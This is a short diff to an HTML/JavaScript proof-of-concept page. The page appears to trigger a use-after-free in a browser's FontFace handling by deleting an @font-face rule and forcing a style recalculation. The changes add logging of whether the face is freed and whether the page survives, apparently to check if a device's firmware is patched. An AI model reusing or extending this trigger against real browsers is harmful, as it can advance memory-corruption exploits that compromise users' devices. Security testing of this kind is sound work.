@@ -57,7 +57,7 @@ function trigger() {
             new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
             new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
             // Remove the CSS @font-face rule and force style recalc.
-            try { document.getElementById('s0').sheet.deleteRule(0); } catch (e) {}
+            var sheet = document.getElementById('s0').sheet; var n0 = sheet ? sheet.cssRules.length : -1; log('rules before delete: ' + n0); try { sheet.deleteRule(0); log('deleteRule OK, rules now: ' + sheet.cssRules.length + ' - FACE FREED'); } catch (e) { log('deleteRule FAILED: ' + e); }
             document.body.offsetTop;
           }
         }
@@ -78,9 +78,7 @@ function trigger() {
       log('load threw: ' + e);
     }
 
-    setTimeout(function () {
-      log('survived 5s after trigger - likely PATCHED on this firmware');
-    }, 5000);
+    setTimeout(function () { log('survived 8s - load promise settled? see resolve/reject lines above'); }, 8000);
   }, 3000);
 }
 
@@ -89,3 +87,4 @@ window.onload = trigger;
 </script>
 </body>
 </html>
+
